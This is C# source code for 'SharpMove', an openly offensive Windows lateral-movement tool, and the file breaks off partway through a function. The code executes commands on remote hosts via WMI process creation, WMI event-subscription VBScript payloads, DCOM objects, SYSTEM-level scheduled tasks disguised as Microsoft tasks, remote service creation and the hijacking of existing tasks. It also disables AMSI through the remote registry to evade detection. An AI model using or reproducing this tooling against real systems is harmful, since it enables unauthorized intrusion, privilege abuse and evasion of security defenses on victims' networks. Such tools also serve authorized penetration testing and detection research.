using System;
using System.Linq;
using TaskScheduler;
using System.Threading;
using System.Management;
using System.Reflection;
using System.ServiceProcess;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace SharpMove
{
    class Program
    {
        //change to whatever vbs you want
        public static string vbsPayload = @"";

        static void Usage()
        {
            Console.WriteLine("\n  SharpMove.exe");
            Console.WriteLine("");
            Console.WriteLine("    SharpMove.exe action=query computername=remote.host.local query=\"select * from win32_process\" username=domain\\user password=password");
            Console.WriteLine("    SharpMove.exe action=create computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug amsi=true username=domain\\user password=password");
            Console.WriteLine("    SharpMove.exe action=executevbs computername=remote.host.local throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug amsi=true username=domain\\user password=password");
            Console.WriteLine("    SharpMove.exe action=taskscheduler computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug taskname=Debug amsi=true username=domain\\user password=password");
            Console.WriteLine("    SharpMove.exe action=dcom computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug method=ShellBrowserWindow amsi=true");
            Console.WriteLine("    SharpMove.exe action=scm computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug servicename=WindowsDebug amsi=true");
        }

        public static System.Collections.Generic.IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { throw new ArgumentNullException("singleLineString"); }

            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        static List<string> ParseCommand(string command)
        {
            List<string> cmdinfo = new List<string>();
            string cmdpath = null;
            string cmdarg = null;
            string[] casplit = new string[2];
            //For now this will dictate a win path
            var spacecount = command.Count(x => x == ' ');
            if (spacecount == 1)
            {
                casplit = command.Split(new[] { ' ' }, 2);
                int counter = casplit[0].LastIndexOf('\\');
                cmdpath = command.Substring(0, counter);
                casplit[0] = casplit[0].Substring(counter);
                casplit[0] = casplit[0].Replace("\\", "");
            }
            else if (command.Contains(":") && command.Contains("\\"))
            {
                //If you have more than two full directory paths I'll be sad
                var colcount = command.Count(xx => xx == ':');
                if (colcount > 1)
                {
                    int col = command.LastIndexOf(':');

                    cmdpath = command.Substring(0, col - 2);
                    cmdarg = command.Substring(col - 1);
                    int slh = cmdpath.LastIndexOf('\\');
                    if (command.Contains(" "))
                    {
                        casplit[0] = cmdpath.Substring(slh);
                        casplit[0] = casplit[0].Replace("\\", "");
                        casplit[1] = cmdarg;
			cmdpath = cmdpath.Replace("\\" + casplit[0], "");
                    }
                    else
                    {
                        casplit[0] = cmdarg;
                        casplit[1] = "";
                    }
                }
                else
                {
                    int counter = command.LastIndexOf('\\');
                    if (counter != -1)
                    {
                        cmdpath = command.Substring(0, counter);
                        cmdarg = command.Substring(counter + 1);
                        if (command.Contains(" "))
                        {
                            casplit = cmdarg.Split(new[] { ' ' }, 2);
                        }
                        else
                        {
                            casplit[0] = cmdarg;
                            casplit[1] = "";
                        }
                    }
                }
            }
            else
            {
                //If no path I'm assuming it's system32
                cmdpath = "C:\\Windows\\system32";
                if (command.Contains(" "))
                {
                    casplit = command.Split(new[] { ' ' }, 2);
                }
                else
                {
                    casplit[0] = command;
                    casplit[1] = "";
                }

            }
            cmdinfo.Add(cmdpath);
            cmdinfo.Add(casplit[0]);
            cmdinfo.Add(casplit[1]);
            return cmdinfo;
        }

        static ManagementScope WMIConnect(string host, string username, string password)
        {
            string wmiNameSpace = "root\\CIMv2";
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("\r\n  Host                           : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+]  User credentials               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+]  WMI connection established");
                return scope;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X]  Failed to connecto to WMI: {0}", ex.Message);
                return null;
            }
        }

        static void LocalWMIQuery(string wmiQuery, string wmiNameSpace = "")
        {
            ManagementObjectSearcher wmiData = null;

            try
            {
                if (String.IsNullOrEmpty(wmiNameSpace))
                {
                    wmiData = new ManagementObjectSearcher(wmiQuery);
                }
                else
                {
                    wmiData = new ManagementObjectSearcher(wmiNameSpace, wmiQuery);
                }

                ManagementObjectCollection data = wmiData.Get();
                Console.WriteLine();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        string propValue = String.Format("{0}", prop.Value);

                        // wrap long output to 80 lines
                        if (!String.IsNullOrEmpty(propValue) && (propValue.Length > 90))
                        {
                            bool header = false;
                            foreach (string line in Split(propValue, 80))
                            {
                                if (!header)
                                {
                                    Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, line));
                                }
                                else
                                {
                                    Console.WriteLine(String.Format("{0,30}   {1}", "", line));
                                }
                                header = true;
                            }
                        }
                        else
                        {
                            Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, prop.Value));
                        }
                    }
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X]  Exception : {0}", ex.Message));
            }
        }

        static void RemoteWMIQuery(string host, string wmiQuery, string wmiNameSpace, string username, string password)
        {
            if (wmiNameSpace == "")
            {
                wmiNameSpace = "root\\cimv2";
            }

            ConnectionOptions options = new ConnectionOptions();

            Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);

            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("  User credentials: {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                ObjectQuery query = new ObjectQuery(wmiQuery);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();

                Console.WriteLine();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, prop.Value));
                    }
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X]  Exception : {0}", ex.Message));
            }
        }

        static void RemoteWMIExecute(ManagementScope scope, string command)
        {
            try
            {
                var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());

                ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");
                System.Management.PropertyDataCollection properties = inParams.Properties;

                inParams["CommandLine"] = command;

                ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);

                Console.WriteLine("[+] Creation of process returned   : {0}", outParams["returnValue"]);
                Console.WriteLine("[+] Process ID                     : {0}\r\n", outParams["processId"]);
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        static void RemoteWMIExecuteVBS(string host, string eventName, string username, string password)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                if (!String.IsNullOrEmpty(username))
                {
                    Console.WriteLine("[*] User credentials   : {0}", username);
                    options.Username = username;
                    options.Password = password;
                }
                Console.WriteLine();

                // first create a 5 second timer on the remote host
                ManagementScope timerScope = new ManagementScope(string.Format(@"\\{0}\root\cimv2", host), options);
                ManagementClass timerClass = new ManagementClass(timerScope, new ManagementPath("__IntervalTimerInstruction"), null);
                ManagementObject myTimer = timerClass.CreateInstance();
                myTimer["IntervalBetweenEvents"] = (UInt32)5000;
                myTimer["SkipIfPassed"] = false;
                myTimer["TimerId"] = "Timer";
                try
                {
                    Console.WriteLine("[+] Creating Event Subscription {0}   : {1}", eventName, host);
                    myTimer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in creating timer object: {0}", ex.Message);
                    return;
                }

                ManagementScope scope = new ManagementScope(string.Format(@"\\{0}\root\subscription", host), options);

                // then install the __EventFilter for the timer object
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                WqlEventQuery myEventQuery = new WqlEventQuery(@"SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'");
                ManagementObject myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = eventName;
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                try
                {
                    myEventFilter.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event filter   : {0}", ex.Message);
                }


                // now create the ActiveScriptEventConsumer payload (VBS)
                ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();

                myEventConsumer["Name"] = eventName;
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbsPayload;
                myEventConsumer["KillTimeout"] = (UInt32)45;

                try
                {
                    myEventConsumer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event consumer: {0}", ex.Message);
                }


                // finally bind them together with a __FilterToConsumerBinding
                ManagementObject myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;

                try
                {
                    myBinder.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting FilterToConsumerBinding: {0}", ex.Message);
                }


                // wait for everything to trigger
                Console.WriteLine("\r\n[+] Waiting 10 seconds for event '{0}' to trigger\r\n", eventName);
                System.Threading.Thread.Sleep(10 * 1000);

                // finally, cleanup
                try
                {
                    myTimer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing 'Timer' interval timer: {0}", ex.Message);
                }

                try
                {
                    myBinder.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing FilterToConsumerBinding: {0}", ex.Message);
                }

                try
                {
                    myEventFilter.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event filter: {0}", ex.Message);
                }

                try
                {
                    myEventConsumer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event consumer: {0}", ex.Message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        static List<ManagementBaseObject> SetRegKey(ManagementScope scope)
        {
            List<ManagementBaseObject> originalstate = new List<ManagementBaseObject>();
            try
            {
                ManagementClass reg = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = reg.GetMethodParameters("EnumKey");
                inParams["hDefKey"] = 0x80000001;
                inParams["sSubKeyName"] = "Software\\Microsoft\\Windows Script";
                ManagementBaseObject outParams = reg.InvokeMethod("EnumKey", inParams, null);

                originalstate.Add(outParams);
                if (outParams.Properties["sNames"].Value == null)
                {
                    Console.WriteLine("[+] Value doesnt exist...creating");
                    ManagementBaseObject in1 = reg.GetMethodParameters("CreateKey");
                    in1["hDefKey"] = 0x80000001;
                    in1["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    ManagementBaseObject out1 = reg.InvokeMethod("CreateKey", in1, null);
                    Console.WriteLine("[+] Created Windows Script");

                    ManagementBaseObject in2 = reg.GetMethodParameters("SetDWORDValue");
                    in2["hDefKey"] = 0x80000001;
                    in2["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    in2["sValueName"] = "AmsiEnable";
                    in2["uValue"] = "0";
                    ManagementBaseObject out2 = reg.InvokeMethod("SetDWORDValue", in2, null);
                    Console.WriteLine("{+] Created AmsiEnable and set to : 0");
                    originalstate.Add(out2);
                }
                else
                {
                    ManagementBaseObject in1 = reg.GetMethodParameters("GetDWORDValue");
                    in1["hDefKey"] = 0x80000001;
                    in1["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    in1["sValueName"] = "AmsiEnable";
                    ManagementBaseObject outParams2 = reg.InvokeMethod("GetDWORDValue", in1, null);

                    originalstate.Add(outParams2);
                    if (outParams2.Properties["uValue"].Value != null)
                    {
                        string origval = outParams2.Properties["uValue"].Value.ToString();
                        Console.WriteLine("[+] Original AmsiEnable value : {0}", origval);

                        if (origval != "0")
                        {
                            ManagementBaseObject inParams3 = reg.GetMethodParameters("SetDWORDValue");
                            inParams3["hDefKey"] = 0x80000001;
                            inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                            inParams3["sValueName"] = "AmsiEnable";
                            inParams3["uValue"] = "0";
                            ManagementBaseObject outParams3 = reg.InvokeMethod("SetDWORDValue", inParams3, null);
                            Console.WriteLine("[+] AmsiEnable set to : 0");
                        }
                    }
                    else
                    {
                        ManagementBaseObject inParams4 = reg.GetMethodParameters("SetDWORDValue");
                        inParams4["hDefKey"] = 0x80000001;
                        inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                        inParams4["sValueName"] = "AmsiEnable";
                        inParams4["uValue"] = "0";
                        ManagementBaseObject outParams4 = reg.InvokeMethod("SetDWORDValue", inParams4, null);
                        Console.WriteLine("[+] Created AmsiEnable and set to : 0");
                    }
                }
                return originalstate;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception    : {0}", ex);
                return null;
            }
        }

        static void UnsetRegKey(ManagementScope scope, List<ManagementBaseObject> outParams)
        {
            try
            {
                ManagementClass reg1 = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                if (outParams[0].Properties["sNames"].Value != null) // Key did exist
                {
                    Console.WriteLine("[+] Windows Script Key existed...leaving alone");
                    if (outParams[1].Properties["uValue"].Value != null)
                    {
                        string originalvalue = outParams[1].Properties["uValue"].Value.ToString();
                        if (originalvalue != "0")
                        {
                            ManagementBaseObject inParams3 = reg1.GetMethodParameters("SetDWORDValue");
                            inParams3["hDefKey"] = 0x80000001;
                            inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                            inParams3["sValueName"] = "AmsiEnable";
                            inParams3["uValue"] = originalvalue;
                            ManagementBaseObject outParams3 = reg1.InvokeMethod("SetDWORDValue", inParams3, null);
                            Console.WriteLine("[+] AmsiEnable set back to : {0}", originalvalue);
                        }
                        else if (originalvalue == "0")
                        {
                            Console.WriteLine("[+] AmsiEnable left at original value: {0}", originalvalue);
                        }
                    }
                    else
                    {
                        ManagementBaseObject inParams4 = reg1.GetMethodParameters("DeleteValue");
                        inParams4["hDefKey"] = 0x80000001;
                        inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                        inParams4["sValueName"] = "AmsiEnable";
                        ManagementBaseObject outParams4 = reg1.InvokeMethod("DeleteValue", inParams4, null);
                        Console.WriteLine("[+] Removed AmsiEnable Value");
                    }
                }
                else //Key did not exist
                {
                    ManagementBaseObject inParams3 = reg1.GetMethodParameters("DeleteValue");
                    inParams3["hDefKey"] = 0x80000001;
                    inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    inParams3["sValueName"] = "AmsiEnable";
                    ManagementBaseObject outParams3 = reg1.InvokeMethod("DeleteValue", inParams3, null);
                    Console.WriteLine("[+] AmsiEnable value removed");

                    ManagementBaseObject inParams2 = reg1.GetMethodParameters("DeleteKey");
                    inParams2["hDefKey"] = 0x80000001;
                    inParams2["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    ManagementBaseObject outParams2 = reg1.InvokeMethod("DeleteKey", inParams2, null);
                    Console.WriteLine("[+] Settings key removed");

                    ManagementBaseObject inParams4 = reg1.GetMethodParameters("DeleteKey");
                    inParams4["hDefKey"] = 0x80000001;
                    inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script";
                    ManagementBaseObject outParams4 = reg1.InvokeMethod("DeleteKey", inParams4, null);
                    Console.WriteLine("[+] Windows Script key removed");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        static void RemoteDCOM(string host, string command, string Method)
        {
            List<string> retcmd = ParseCommand(command);
            string Directory = retcmd[0];
            string Parameters = retcmd[2];
            string Command = retcmd[1];

            try
            {
                if (Method.ToLower() == "shellwindows")
                {
                    Console.WriteLine("[+] Executing DCOM ShellWindows   : {0}", host);
                    var CLSID = "9BA05972-F6A8-11CF-A442-00A0C90A8F39";
                    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), host);
                    object RemoteComObject = NewMethod(ComType);
                    object Item = RemoteComObject.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { });
                    object Document = Item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, Item, null);
                    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, Directory, null, 0 });
                }
                else if (Method.ToLower() == "mmc")
                {
                    Console.WriteLine("[+] Executing DCOM MMC     : {0}", host);
                    Type ComType = Type.GetTypeFromProgID("MMC20.Application", host);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                    object ActiveView = Document.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, Document, null);
                    ActiveView.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, ActiveView, new object[] { Command, null, null, 7 });
                }
                else if (Method.ToLower() == "shellbrowserwindow")
                {
                    Console.WriteLine("[+] Executing DCOM ShellBrowserWindow   : {0}", host);
                    var CLSID = "C08AFD90-F2A1-11D1-8455-00A0C91F3880";
                    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), host);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                    Console.WriteLine("Executing ShellBrowserWindow");
                    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, Directory, null, 0 });
                }
                else if (Method.ToLower() == "exceldde")
                {
                    Console.WriteLine("[+] Executing DCOM ExcelDDE   : {0}", host);
                    Type ComType = Type.GetTypeFromProgID("Excel.Application", host);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    RemoteComObject.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, RemoteComObject, new object[] { false });
                    RemoteComObject.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { Command, Parameters });
                }
                else
                {
                    Console.WriteLine("[X] Error    :  You must supply arguments");
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("[X] DCOM Failed   : " + e.Message);
            }
        }

        static void DCOMHijack(string host, string clsid)
        {
            //Untested, use at own risk
            try
            {
                Console.WriteLine("[+] DCOM Hijack for CLSID   :  {0}   {1}", clsid, host);
                var CLSID = clsid;
                Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), host);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("[X] DCOM Hijack Failed   : " + e.Message);
            }
        }

        static void CreateSchTask(string host, string username, string password, string command, string taskname)
        {
            List<string> retcmd = ParseCommand(command);
            string Directory = retcmd[0];
            string Parameters = retcmd[2];
            string Binary = retcmd[1];
            string Command = String.Format("{0}\\{1}", Directory, Binary);
            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();
            //For now this will be SYSTEM only - needs to be updated
            string runas = "SYSTEM";
            string[] logininfo = new string[2];
            if (username != "" && password != "")
            {
                if (username.Contains("\\"))
                {
                    logininfo[1] = username.Split('\\')[1];
                    logininfo[0] = username.Split('\\')[0];
                }
                else
                {
                    logininfo[0] = ".";
                    logininfo[1] = username;
                }
                try
                {
                    scheduler.Connect(host, logininfo[1], logininfo[0], password);
                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine("[X] Error:  {0}", e.Message);
                    Environment.Exit(0);
                }
            }
            else
            {
                try
                {
                    scheduler.Connect(host);
                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine("[X] Error:  {0}", e.Message);
                    Environment.Exit(0);
                }
            }
            ITaskDefinition task = scheduler.NewTask(0);
            task.RegistrationInfo.Author = "Microsoft Corporation";
            task.RegistrationInfo.Description = "Microsoft Services Standby Task";
            task.Settings.RunOnlyIfIdle = false;

            IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
            action.Id = "Exec Action";
            action.Path = Command;
            action.Arguments = Parameters;

            ITaskFolder folder = scheduler.GetFolder("\\");
            Console.WriteLine("[+] Creating task '{0}' on   : {1}", taskname, host);
            IRegisteredTask regTask = folder.RegisterTaskDefinition(taskname, task, (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE, runas, null, _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN, "");
            Console.WriteLine("[+] Executing '{0}' task...  : {1}", taskname, host);
            Thread.Sleep(2000);
            IRunningTask runTask = regTask.Run(null);
        }

        static void DeleteSchTask(string host, string username, string password, string taskname)
        {
            TaskScheduler.TaskScheduler objScheduler = new TaskScheduler.TaskScheduler();
            string[] logininfo = new string[2];
            if (username != "" && password != "")
            {
                if (username.Contains("\\"))
                {
                    logininfo[1] = username.Split('\\')[1];
                    logininfo[0] = username.Split('\\')[0];
                }
                else
                {
                    logininfo[0] = ".";
                    logininfo[1] = username;
                }
                try
                {
                    objScheduler.Connect(host, logininfo[1], logininfo[0], password);
                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine("[X] Error: {0}", e.Message);
                }
            }
            else
            {
                try
                {
                    objScheduler.Connect(host);
                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine("[X] Error: {0}", e.Message);
                }
            }
            ITaskFolder containingFolder = objScheduler.GetFolder("\\");
            Console.WriteLine("[+] Deleting task {0} on    : {1}", taskname, host);
            containingFolder.DeleteTask(taskname, 0);
        }

        static void CreateService(string host, string serviceName, string binpath)
        {
            IntPtr scmHandle = OpenSCManager(host, null, SC_MANAGER_CREATE_SERVICE);
            if (scmHandle == IntPtr.Zero)
            {
                throw new Exception("[X] Failed to obtain a handle to the service control manager database - MAKE SURE YOU ARE ADMIN");
            }

            Console.WriteLine("[+] Creating {0} service on   : {1}", serviceName, host);
            IntPtr serviceHandle = CreateService(scmHandle, serviceName, serviceName, SERVICE_ACCESS.SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, binpath, null, IntPtr.Zero, null, null, null);
            if (serviceHandle == IntPtr.Zero)
            {
                throw new Exception($"[X] Failed to obtain a handle to service '{serviceName}'.");
            }

            Console.WriteLine("[+] Starting {0} service on   : {1}", serviceName, host);
            Thread.Sleep(1000);
            StartService(serviceHandle, 0, null);
            Console.WriteLine("[+] {0} has been enabled and started on   : {1}", serviceName, host);

            if (scmHandle != IntPtr.Zero)
                CloseServiceHandle(scmHandle);
            if (serviceHandle != IntPtr.Zero)
                CloseServiceHandle(serviceHandle);
        }

        static void DeleteService(string host, string serviceName)
        {
            IntPtr scmHandle = OpenSCManager(host, null, SC_MANAGER_CREATE_SERVICE);
            if (scmHandle == IntPtr.Zero)
            {
                throw new Exception("[X] Failed to obtain a handle to the service control manager database - MAKE SURE YOU ARE ADMIN");
            }

            IntPtr serviceHandle = OpenService(scmHandle, serviceName, SERVICE_ACCESS.SERVICE_ALL_ACCESS);
            if (serviceHandle == IntPtr.Zero)
            {
                throw new Exception($"[X] Failed to obtain a handle to service '{serviceName}'.");
            }

            DeleteService(serviceHandle);
            Console.WriteLine("[+] Service {0} has been deleted on   : {1}", serviceName, host);
        }
        
        static void StartService(string host, string servicename)
        {
            try
            {
                ServiceController targetservice = new ServiceController(servicename, host);
                if (targetservice.Status == ServiceControllerStatus.Running || targetservice.Status == ServiceControllerStatus.StartPending)
                {
                    Console.WriteLine("[-] Service {0} is currently stopped", targetservice.ServiceName);
                    Console.WriteLine("[-] Service status      : {0}", targetservice.Status.ToString());
                    return;
                }
                targetservice.Start();
                targetservice.WaitForStatus(ServiceControllerStatus.Running);
                Console.WriteLine("[+] Service started       :  {0} - {1}  ", targetservice.ServiceName, host);

            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: {0}", ex.Message);
            }
        }

        static void StopService(string host, string servicename)
        {
            try
            {
                ServiceController targetservice = new ServiceController(servicename, host);
                if (targetservice.Status == ServiceControllerStatus.Stopped || targetservice.Status == ServiceControllerStatus.StopPending)
                {
                    Console.WriteLine("[-] Service {0} is currently stopped", targetservice.ServiceName);
                    Console.WriteLine("[-] Service status      : {0}", targetservice.Status.ToString());
                    return;
                }
                targetservice.Stop();
                targetservice.WaitForStatus(ServiceControllerStatus.Stopped);
                Console.WriteLine("[+] Service stopped        :  {0} - {1}  ", targetservice.ServiceName, host);
            }
            catch(Exception ex)
            {
                Console.WriteLine("[-] Error: {0}", ex.Message);
            }
        }

        static void ModSchTask(string host, string username, string password, string command, string taskname, string sfolder)
        {
            List<string> retcmd = ParseCommand(command);
            string Directory = retcmd[0];
            string Parameters = retcmd[2];
            string Binary = retcmd[1];
            string Command = String.Format("{0}\\{1}", Directory, Binary);
            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();

            string runas = string.Empty;
            string[] logininfo = new string[2];
            if (username != "" && password != "")
            {
                if (username.Contains("\\"))
                {
                    logininfo[1] = username.Split('\\')[1];
                    logininfo[0] = username.Split('\\')[0];
                }
                else
                {
                    logininfo[0] = ".";
                    logininfo[1] = username;
                }
                try
                {
                    scheduler.Connect(host, logininfo[1], logininfo[0], password);
                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine("[X] Error   :  {0}", e.Message);
                    return;
                }
            }
            else
            {
                try
                {
                    scheduler.Connect(host);
                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine("[X] Error   :  {0}", e.Message);
                    Environment.Exit(0);
                }
            }

            ITaskFolder f1 = scheduler.GetFolder(sfolder);
            ITaskDefinition otask = null;
            IRegisteredTaskCollection tasks = f1.GetTasks(1);
            _TASK_LOGON_TYPE ltype = _TASK_LOGON_TYPE.TASK_LOGON_S4U;
            IRegistrationInfo tsksecdes = null;
            string origcmd = string.Empty;
            string origargs = string.Empty;

            foreach (IRegisteredTask tsk in tasks)
            {
                if (tsk.Name.Equals(taskname))
                {
                    otask = tsk.Definition;
                    runas = otask.Principal.UserId;
                    ltype = otask.Principal.LogonType;
                    tsksecdes = otask.RegistrationInfo.SecurityDescriptor;
                    //tsk.GetSecurityDescriptor()
                }
            }

            Console.WriteLine("[+] Original Task Information");
            ITriggerCollection triggerCollection = otask.Triggers;
            foreach (ITrigger trigger in triggerCollection)
            {
            }
            IActionCollection actionCollection = otask.Actions;
            foreach (IExecAction acts in actionCollection)
            {
                if (acts.Type != _TASK_ACTION_TYPE.TASK_ACTION_EXEC)
                {
                    Console.WriteLine("[X] Task doesn't have exec action");
                    return;
                }
                else
                {
                    origcmd = acts.Path;
                    origargs = acts.Arguments;
                    Console.WriteLine("  [+] Taskname and ID      :  {0} - {1}", taskname, acts.Id);
                    Console.WriteLine("  [+] Action and args      :  {0} {1}", origcmd, origargs);
                    Console.WriteLine();
                }
            }
            actionCollection.Clear();
            IExecAction newact = (IExecAction)otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
            newact.Path = Command;
            newact.Arguments = Parameters;
            /*
            if (actionid != "" || actionid != string.Empty)
            {
                newact.Id = actionid;
            }
            */
            otask.Actions = actionCollection;
            try
            {
                Console.WriteLine("[+] Modifying task action      :  {0}", command);
                IRegisteredTask regTask1 = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes);
                Thread.Sleep(2000);
                IRunningTask runTask = regTask1.Run(null);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error     : {0}", ex.Message);
                return;
            }

            Thread.Sleep(3000);
            Console.WriteLine("[+] Setting {0} back to original state", taskname);
            actionCollection.Clear();
            IExecAction origact = (IExecAction)otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
            origact.Path = origcmd;
            origact.Arguments = origargs;

            try
            {
                IRegisteredTask regTask2 = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes);
                Thread.Sleep(1000);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error    : {0}", ex.Message);
                return;
            }
        }

        static void ModServiceWMI(ManagementScope scope, string servicename, string command)
        {
            try
            {
                string srvpath = string.Format("Win32_Service.Name='{0}'", servicename);
